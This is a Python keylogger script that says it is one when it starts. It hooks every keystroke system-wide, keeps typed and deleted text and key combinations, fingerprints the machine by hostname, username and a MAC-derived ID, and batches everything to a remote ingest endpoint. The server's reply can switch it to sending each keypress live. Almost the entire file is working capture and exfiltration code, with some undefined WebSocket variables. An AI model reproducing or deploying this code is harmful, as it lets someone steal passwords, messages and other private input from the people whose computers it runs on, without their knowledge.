import keyboard
import logging
import os
import requests
import time
import threading
import json
import queue
import datetime
import socket
import getpass
import platform
import uuid
import hashlib


def _build_device_info():
    hostname = socket.gethostname()
    try:
        username = getpass.getuser()
    except Exception:
        username = "unknown"
    try:
        mac = uuid.getnode()
    except Exception:
        mac = 0
    device_id = hashlib.sha256(f"{hostname}|{mac}".encode("utf-8")).hexdigest()[:16]
    return {
        "id": device_id,
        "hostname": hostname,
        "username": username,
        "platform": platform.system(),
        "platformVersion": platform.release(),
    }


DEVICE_INFO = _build_device_info()

# Set up logging
log_file = "logs.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')


# HTTP batching queue and lock
batch_queue = queue.Queue()
batch_lock = threading.Lock()
current_mode = "structured"

# Buffer to accumulate keystrokes as chronological segments of
# [text, deleted]. Deleted segments record characters the user typed and
# then erased so the frontend can render them greyed out / struck through.
keystroke_segments = []
last_key_time = None
idle_threshold = 2.5  # seconds

# Track the last flushed visible text so a backspace pressed after the buffer
# has already been sent can retroactively mark characters in the previous
# message as deleted. The 60s window is measured against the last typed char.
last_flushed_text = ""
last_char_time = 0.0
DELETE_PREVIOUS_WINDOW = 60.0

# When the user presses arrow left/right within the edit window we enter
# "previous edit" mode. prev_cursor is an offset into last_flushed_text; all
# typing / backspace while it is not None targets the previous message.
prev_cursor = None


def _live_tail_char():
    for seg in reversed(keystroke_segments):
        if not seg[1] and seg[0]:
            return seg[0][-1]
    return ""


def _append_live(text):
    if not text:
        return
    if keystroke_segments and not keystroke_segments[-1][1]:
        keystroke_segments[-1][0] += text
    else:
        keystroke_segments.append([text, False])


def _delete_n_chars(n):
    """Mark the last n undeleted chars as deleted, preserving history."""
    if n <= 0:
        return
    remaining = n
    removed_parts = []
    for i in range(len(keystroke_segments) - 1, -1, -1):
        if remaining <= 0:
            break
        seg = keystroke_segments[i]
        if seg[1] or not seg[0]:
            continue
        take = min(remaining, len(seg[0]))
        removed_parts.append(seg[0][-take:])
        seg[0] = seg[0][:-take]
        remaining -= take
    # Drop now-empty undeleted segments.
    keystroke_segments[:] = [s for s in keystroke_segments if s[1] or s[0]]
    if not removed_parts:
        return
    removed = "".join(reversed(removed_parts))
    if keystroke_segments and keystroke_segments[-1][1]:
        # Newly-removed chars were earlier in the original text than the
        # already-deleted run, so they come first in reading order.
        keystroke_segments[-1][0] = removed + keystroke_segments[-1][0]
    else:
        keystroke_segments.append([removed, True])


def _live_length():
    return sum(len(s[0]) for s in keystroke_segments if not s[1])


def _live_text():
    return "".join(s[0] for s in keystroke_segments if not s[1])


def _word_delete_count():
    live = _live_text()
    if not live:
        return 0
    i = len(live)
    while i > 0 and live[i - 1].isspace():
        i -= 1
    while i > 0 and not live[i - 1].isspace():
        i -= 1
    count = len(live) - i
    return count if count > 0 else len(live)


def _word_delete_count_from(text):
    if not text:
        return 0
    i = len(text)
    while i > 0 and text[i - 1].isspace():
        i -= 1
    while i > 0 and not text[i - 1].isspace():
        i -= 1
    count = len(text) - i
    return count if count > 0 else len(text)


def _prev_edit_alive():
    return bool(last_flushed_text) and (time.time() - last_char_time) <= DELETE_PREVIOUS_WINDOW


def _enter_prev_edit():
    """Prepare to retroactively edit the previous flushed message."""
    global prev_cursor
    # Flush any pending live text first so the arrow can navigate it too.
    if keystroke_segments:
        flush_buffer()
    if not _prev_edit_alive():
        prev_cursor = None
        return False
    if prev_cursor is None:
        prev_cursor = len(last_flushed_text)
    return True


def _exit_prev_edit():
    global prev_cursor
    prev_cursor = None


def _send_edit_previous(payload):
    # Not supported in HTTP mode
    pass


def _prev_edit_insert(text):
    global last_flushed_text, prev_cursor
    if prev_cursor is None or not text:
        return
    offset = prev_cursor
    last_flushed_text = last_flushed_text[:offset] + text + last_flushed_text[offset:]
    prev_cursor = offset + len(text)
    _send_edit_previous({
        "type": "edit_previous",
        "op": "insert",
        "offset": offset,
        "text": text,
        "timestamp": time.time(),
    })


def _prev_edit_backspace(count=1):
    global last_flushed_text, prev_cursor
    if prev_cursor is None or prev_cursor <= 0 or count <= 0:
        return
    count = min(count, prev_cursor)
    offset = prev_cursor - count
    last_flushed_text = last_flushed_text[:offset] + last_flushed_text[prev_cursor:]
    prev_cursor = offset
    _send_edit_previous({
        "type": "edit_previous",
        "op": "delete",
        "offset": offset,
        "count": count,
        "timestamp": time.time(),
    })


def _send_delete_previous(count):
    # Not supported in HTTP mode
    pass

# Track currently held keys
held_keys = set()

# Current capture mode: "structured" (buffered) or "raw" (send on every keypress)
current_mode = "structured"

# Master exit trigger state. Typing the word "crash" arms the trigger; three
# shift key presses while armed will kill the script.
EXIT_WORD = "crash"
EXIT_SHIFT_COUNT = 3
_exit_recent_chars = ""
_exit_armed = False
_exit_shift_presses = 0


def _master_exit():
    print("\nMaster exit triggered. Shutting down.")
    try:
        flush_buffer()
    except Exception:
        pass
    os._exit(0)


def _check_master_exit(event):
    """Watch for the word 'crash' followed by N shift key presses."""
    global _exit_recent_chars, _exit_armed, _exit_shift_presses

    if event.event_type != "down":
        return

    name = event.name
    if _exit_armed:
        if name == "shift":
            _exit_shift_presses += 1
            if _exit_shift_presses >= EXIT_SHIFT_COUNT:
                _master_exit()
            return
        # Any non-shift key press while armed cancels the trigger.
        _exit_armed = False
        _exit_shift_presses = 0
        _exit_recent_chars = ""

    if len(name) == 1:
        _exit_recent_chars = (_exit_recent_chars + name.lower())[-len(EXIT_WORD):]
        if _exit_recent_chars == EXIT_WORD:
            _exit_armed = True
            _exit_shift_presses = 0
    else:
        # Non-character key breaks the word-in-progress.
        _exit_recent_chars = ""


# Define a function to handle the fallback delay
def fallback_flush():
    global last_key_time
    while True:
        if last_key_time and (time.time() - last_key_time > 5):
            flush_buffer()
            last_key_time = None
        time.sleep(0.1)


# Define a function to flush the buffer and send data
def flush_buffer():
    global keystroke_segments, last_flushed_text, prev_cursor
    if keystroke_segments:
        live_snapshot = _live_text()
        try:
            payload = [
                {"text": s[0], "deleted": s[1]}
                for s in keystroke_segments
                if s[0]
            ]
            if payload:
                with batch_lock:
                    batch_queue.put({
                        "device": DEVICE_INFO,
                        "data": payload,
                        "timestamp": time.time(),
                    })
                if live_snapshot:
                    last_flushed_text = live_snapshot
                    prev_cursor = None
        except Exception as e:
            print(f"Error queueing buffer: {e}")
        finally:
            keystroke_segments = []

# Define the function to log key events
def log_key_event(event):
    global last_key_time, ws, ws_lock, held_keys, current_mode, last_char_time, prev_cursor

    _check_master_exit(event)

    if current_mode == "raw":
        if event.event_type == "down":
            try:
                with ws_lock:
                    if ws and ws.sock and ws.sock.connected:
                        ws.send(json.dumps({"data": event.name, "timestamp": time.time()}))
            except Exception as e:
                print(f"Error sending raw key via WebSocket: {e}")
        return

    current_time = time.time()
    if last_key_time and (current_time - last_key_time > idle_threshold):
        flush_buffer()  # Flush the buffer if idle threshold is exceeded

    last_key_time = current_time

    modifiers = {"ctrl", "alt", "shift", "win", "cmd"}
    if not hasattr(log_key_event, "combo_buffer"):
        log_key_event.combo_buffer = set()

    if event.event_type == "down":
        if event.name not in held_keys:
            held_keys.add(event.name)
            ctrl_held = any(m in held_keys and m != event.name for m in ("ctrl",))

            # Arrow left/right navigates the previous flushed message while the
            # 60s edit window is still alive.
            if event.name in ("left", "right"):
                if _enter_prev_edit():
                    if event.name == "left" and prev_cursor > 0:
                        prev_cursor -= 1
                    elif event.name == "right" and prev_cursor < len(last_flushed_text):
                        prev_cursor += 1
                    last_char_time = current_time
                return

            if event.name == "space":
                if prev_cursor is not None and _prev_edit_alive():
                    _prev_edit_insert(" ")
                    last_char_time = current_time
                    return
                if _live_tail_char() != " ":
                    _append_live(" ")
                last_char_time = current_time
                flush_buffer()  # Flush on space
            elif event.name == "enter":
                if prev_cursor is not None and _prev_edit_alive():
                    _prev_edit_insert("\n")
                    last_char_time = current_time
                    return
                if _live_tail_char() != "\n":
                    _append_live("\n")
                last_char_time = current_time
                flush_buffer()  # Flush on enter
            elif event.name == "backspace":
                if _live_length() > 0:
                    if ctrl_held:
                        _delete_n_chars(_word_delete_count())
                    else:
                        _delete_n_chars(1)
                elif prev_cursor is not None and _prev_edit_alive():
                    count = 1
                    if ctrl_held:
                        count = _word_delete_count_from(last_flushed_text[:prev_cursor])
                    _prev_edit_backspace(count)
                    last_char_time = current_time
                else:
                    count = (
                        _word_delete_count_from(last_flushed_text) if ctrl_held else 1
                    )
                    _send_delete_previous(count)
            elif event.name in modifiers:
                # Don't log modifier alone yet, wait for up event
                pass
            else:
                combo_mods = [mod for mod in sorted(held_keys) if mod in modifiers and mod != event.name]
                shift_only = combo_mods and all(mod == "shift" for mod in combo_mods)
                if shift_only and len(event.name) == 1:
                    if prev_cursor is not None and _prev_edit_alive():
                        _prev_edit_insert(event.name)
                    else:
                        _append_live(event.name)
                    last_char_time = current_time
                    log_key_event.combo_buffer = set()
                elif combo_mods:
                    # A modifier+key shortcut. Flush any pending text so the
                    # combo is rendered as its own structured entry.
                    flush_buffer()
                    combo_str = "+".join(combo_mods) + "+" + event.name
                    try:
                        with ws_lock:
                            if ws and ws.sock and ws.sock.connected:
                                ws.send(json.dumps({
                                    "type": "combo",
                                    "data": combo_str,
                                    "timestamp": time.time(),
                                }))
                    except Exception as e:
                        print(f"Error sending combo via WebSocket: {e}")
                    log_key_event.combo_buffer = set(combo_mods)
                elif len(event.name) == 1:
                    if prev_cursor is not None and _prev_edit_alive():
                        _prev_edit_insert(event.name)
                    else:
                        _append_live(event.name)
                    last_char_time = current_time
                    log_key_event.combo_buffer = set()
        else:
            return  # Ignore repeated 'down' events for the same key
    elif event.event_type == "up":
        if event.name in held_keys:
            held_keys.discard(event.name)
            if event.name in modifiers:
                if event.name in log_key_event.combo_buffer:
                    log_key_event.combo_buffer.remove(event.name)
        else:
            return  # Ignore stray 'up' events


threading.Thread(target=fallback_flush, daemon=True).start()


# HTTP batching thread
def batch_sender():
    global current_mode
    BATCH_INTERVAL = 2.0  # seconds
    BATCH_MAX = 20
    endpoint = "https://keylogger-py.vercel.app/api/ingest"
    while True:
        batch = []
        try:
            # Wait for at least one item
            item = batch_queue.get(timeout=BATCH_INTERVAL)
            batch.append(item)
        except Exception:
            pass
        # Gather up to BATCH_MAX or until interval
        while not batch_queue.empty() and len(batch) < BATCH_MAX:
            try:
                batch.append(batch_queue.get_nowait())
            except Exception:
                break
        if not batch:
            continue
        # Send batch
        try:
            for entry in batch:
                resp = requests.post(endpoint, json=entry, timeout=5)
                if resp.ok:
                    data = resp.json()
                    new_mode = data.get("mode")
                    if new_mode and new_mode != current_mode:
                        if current_mode == "structured":
                            flush_buffer()
                        current_mode = new_mode
                        print(f"Mode switched to: {current_mode}")
                else:
                    print(f"Failed to POST: {resp.status_code}")
        except Exception as e:
            print(f"Batch send error: {e}")

threading.Thread(target=batch_sender, daemon=True).start()


# Add a listener for key events
keyboard.hook(log_key_event, suppress=False)

# Periodically flush the buffer to ensure no data is lost
threading.Thread(target=lambda: keyboard.wait(), daemon=True).start()

# Keep the script running
if __name__ == "__main__":
    try:
        print("Keylogger is running. Press Ctrl+C to stop.")
        while True:
            time.sleep(1)  # Prevent high CPU usage
    except KeyboardInterrupt:
        print("\nKeylogger stopped.")
        if ws:
            ws.close()
